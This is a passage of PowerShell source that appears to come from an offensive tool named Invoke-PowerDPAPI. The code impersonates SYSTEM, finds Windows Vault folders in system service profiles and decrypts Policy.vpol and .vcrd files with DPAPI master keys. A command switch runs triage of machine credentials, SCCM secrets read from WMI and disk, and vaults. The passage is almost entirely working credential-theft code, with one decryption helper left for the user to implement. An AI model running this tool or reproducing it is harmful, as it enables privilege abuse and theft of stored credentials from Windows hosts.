                    $entryDataString = ($entryData | ForEach-Object { "{0:X2}" -f $_ }) -join ' '
                    Write-Host "    Property $id     : $entryDataString"
                }
            }
        }
    }
}


function Describe-VaultCred {
    param([byte[]]$VaultBytes,[array]$AESKeys)

    # Decrypts Windows Vault credential files using extracted AES keys from vault policy.
    # Hand-off: Calls AESDecrypt for credential decryption, then Describe-VaultItem for credential parsing.

    $aes128key = $AESKeys[0]
    $aes256key = $AESKeys[1]

    $offset = 0
    $finalAttributeOffset = 0

    # skip schema GUID
    $offset += 16

    $unk0 = [BitConverter]::ToInt32($VaultBytes, $offset)
    $offset += 4

    $lastWritten = [BitConverter]::ToInt64($VaultBytes, $offset)
    $offset += 8
    $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
    Write-Host "`n    LastWritten      : $lastWrittenTime"

    # skip unk1/unk2
    $offset += 8

    $friendlyNameLen = [BitConverter]::ToInt32($VaultBytes, $offset)
    $offset += 4
    $friendlyName = [System.Text.Encoding]::Unicode.GetString($VaultBytes, $offset, $friendlyNameLen)
    $offset += $friendlyNameLen
    Write-Host "    FriendlyName     : $friendlyName"

    $attributeMapLen = [BitConverter]::ToInt32($VaultBytes, $offset)
    $offset += 4

    $numberOfAttributes = [math]::Floor($attributeMapLen / 12)
    $attributeMap = @{}

    for ($i = 0; $i -lt $numberOfAttributes; ++$i) {
        $attributeNum = [BitConverter]::ToInt32($VaultBytes, $offset)
        $offset += 4
        $attributeOffset = [BitConverter]::ToInt32($VaultBytes, $offset)
        $offset += 8 # skip unk
        $attributeMap[$attributeNum] = $attributeOffset
    }

    $leftover = $VaultBytes[222..($VaultBytes.Length - 1)]

    foreach ($attribute in $attributeMap.GetEnumerator()) {
        $attributeOffset = $attribute.Value + 16

        if ($attribute.Key -ge 100) {
            $attributeOffset += 4
        }

        $dataLen = [BitConverter]::ToInt32($VaultBytes, $attributeOffset)
        $attributeOffset += 4

        $finalAttributeOffset = $attributeOffset

        if ($dataLen -gt 0) {
            $IVPresent = [BitConverter]::ToBoolean($VaultBytes, $attributeOffset)
            $attributeOffset += 1

            if (-not $IVPresent) {
                $dataBytes = $VaultBytes[$attributeOffset..($attributeOffset + $dataLen - 2)]
                $finalAttributeOffset = $attributeOffset + $dataLen - 1
                # You must implement AESDecrypt
                $decBytes = AESDecrypt -Key $aes128key -IV @() -Data $dataBytes
            } else {
                $IVLen = [BitConverter]::ToInt32($VaultBytes, $attributeOffset)
                $attributeOffset += 4
                $IVBytes = $VaultBytes[$attributeOffset..($attributeOffset + $IVLen - 1)]
                $attributeOffset += $IVLen
                $dataBytes = $VaultBytes[$attributeOffset..($attributeOffset + $dataLen - 1 - 4 - $IVLen)]
                $attributeOffset += $dataLen - 1 - 4 - $IVLen
                $finalAttributeOffset = $attributeOffset
                $decBytes = AESDecrypt -Key $aes256key -IV $IVBytes -Data $dataBytes
                Describe-VaultItem -VaultItemBytes $decBytes
            }
        }
    }

    if (($numberOfAttributes -gt 0) -and ($unk0 -lt 4)) {
        $clearOffset = $finalAttributeOffset - 2
        $clearBytes = $VaultBytes[$clearOffset..($VaultBytes.Length - 1)]

        $cleatOffSet2 = 0
        $cleatOffSet2 += 4 # skip ID

        $dataLen = [BitConverter]::ToInt32($clearBytes, $cleatOffSet2)
        $cleatOffSet2 += 4

        if ($dataLen -gt 2000) {
            Write-Host "    [*] Vault credential clear attribute is > 2000 bytes, skipping..."
        } elseif ($dataLen -gt 0) {
            $IVPresent = [BitConverter]::ToBoolean($VaultBytes, $cleatOffSet2)
            $cleatOffSet2 += 1

            if (-not $IVPresent) {
                $dataBytes = $clearBytes[$cleatOffSet2..($cleatOffSet2 + $dataLen - 2)]
                $decBytes = AESDecrypt -Key $aes128key -IV @() -Data $dataBytes
            } else {
                $IVLen = [BitConverter]::ToInt32($clearBytes, $cleatOffSet2)
                $cleatOffSet2 += 4
                $IVBytes = $clearBytes[$cleatOffSet2..($cleatOffSet2 + $IVLen - 1)]
                $cleatOffSet2 += $IVLen
                $dataBytes = $clearBytes[$cleatOffSet2..($cleatOffSet2 + $dataLen - 1 - 4 - $IVLen)]
                $cleatOffSet2 += $dataLen - 1 - 4 - $IVLen
                $decBytes = AESDecrypt -Key $aes256key -IV $IVBytes -Data $dataBytes
                Describe-VaultItem -VaultItemBytes $decBytes
            }
        }
    }
}


function Triage-SystemVaults {
    param([hashtable]$MasterKeys)

    # Orchestrates Windows Vault enumeration and decryption across system service profiles.
    # Hand-off: Calls Triage-VaultFolder for each vault directory containing Policy.vpol files.

    Write-Host "`n[*] Triaging SYSTEM Vaults`n"

    $folderLocations = @(
        "${env:SystemRoot}\System32\config\systemprofile\AppData\Local\Microsoft\Vault",
        "${env:SystemRoot}\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault",
        "${env:SystemRoot}\ServiceProfiles\LocalService\AppData\Local\Microsoft\Vault",
        "${env:SystemRoot}\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Vault",
        "${env:SystemRoot}\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Vault",
        "${env:SystemRoot}\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Vault"
    )

    foreach ($location in $folderLocations) {
        if (-not (Test-Path -Path $location -PathType Container)) { 
            continue 
        }

        $vaultDirs = Get-ChildItem -Path $location -Directory | 
                     Select-Object -ExpandProperty FullName

        foreach ($vaultDir in $vaultDirs) {
            $dirName = Split-Path $vaultDir -Leaf
            if ($dirName -match '^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$') {
                Triage-VaultFolder -Folder $vaultDir -MasterKeys $MasterKeys
            }
        }
    }
}



function Triage-VaultFolder {
    param ([string]$Folder, [hashtable]$MasterKeys)

    # Processes Windows Vault policy files and credential files within a vault directory.
    # Hand-off: Calls Describe-VaultPolicy for policy decryption, then Describe-VaultCred for each credential file.

    $PolicyFilePath = "$Folder\Policy.vpol"

    if (-not ([System.IO.File]::Exists($PolicyFilePath))) {
        return
    }

    Write-Host "[*] Triaging Vault Folder: $Folder"

    $PolicyBytes = [System.IO.File]::ReadAllBytes($PolicyFilePath)

    $keys = Describe-VaultPolicy $PolicyBytes $MasterKeys

    if ($keys.Count -eq 0) {
        return
    }

    $VaultCredFiles = [System.IO.Directory]::GetFiles($Folder)

    if ($VaultCredFiles -eq $null -or $VaultCredFiles.Length -eq 0) {
        return
    }

    foreach ($VaultCredFile in $VaultCredFiles) {
        $FileName = [System.IO.Path]::GetFileName($VaultCredFile)

        if (-not ($FileName.EndsWith("vcrd"))) {
            continue
        }

        try {
            $vaultCredBytes = [System.IO.File]::ReadAllBytes($VaultCredFile)
            Describe-VaultCred $vaultCredBytes $keys
        }
        
        catch {
            Write-Host "ERROR"
        }
    }
}



function Invoke-PowerDPAPI
{
    param ([string]$Command, [switch] $SaveTS)

    Write-Host "`n"

    $Impersonate = Invoke-Impersonate

    if (-not ($Impersonate))
    {
        return "[!] Unable to elevate"
    }

    try
    {
        $MasterKeys = $null

                if ($SaveTS)
                { 
                    $global:NoSave  = $false
                }

                else 
                {
                    $global:NoSave  = $true
                }

        switch ($Command)
        {
            "MachineTriage"
            
            {
              
                $MasterKeys         = Triage-SystemMasterKeys
                Triage-SystemCreds  -MasterKeys $MasterKeys
                Triage-SccmWMI      -MasterKeys $MasterKeys
                Triage-SccmDisk     -MasterKeys $MasterKeys
                Triage-SystemVaults -MasterKeys $MasterKeys
            }

            "MachineVaults"
            
            {
                $MasterKeys         = Triage-SystemMasterKeys
                Triage-SystemVaults -MasterKeys $MasterKeys
            }

            "MachineCredentials"
            
            {
                $MasterKeys        = Triage-SystemMasterKeys
                Triage-SystemCreds -MasterKeys $MasterKeys
            }

            "SCCM"
            
            {
                
                $MasterKeys        = Triage-SystemMasterKeys
                Triage-SccmWMI     -MasterKeys $MasterKeys
                Triage-SccmDisk    -MasterKeys $MasterKeys
            }

            "SCCM_WMI"
            
            {
                
                $MasterKeys        = Triage-SystemMasterKeys
                Triage-SccmWMI     -MasterKeys $MasterKeys
            }

            "SCCM_DISK"
            
            {
                $MasterKeys       = Triage-SystemMasterKeys
                Triage-SccmDisk   -MasterKeys $MasterKeys
            }

            Default
            
            {
                Write-Host "[*] Command not recognised"
            }
        }
    }
    
    finally
    {
        
        if (Get-Variable -Name "mappings" -Scope "Global" -ErrorAction "SilentlyContinue")
        {
            Remove-Variable -Name "mappings" -Scope "Global" -Force
        }

        $FnRevertToSelf.Invoke() > $null
    }
}
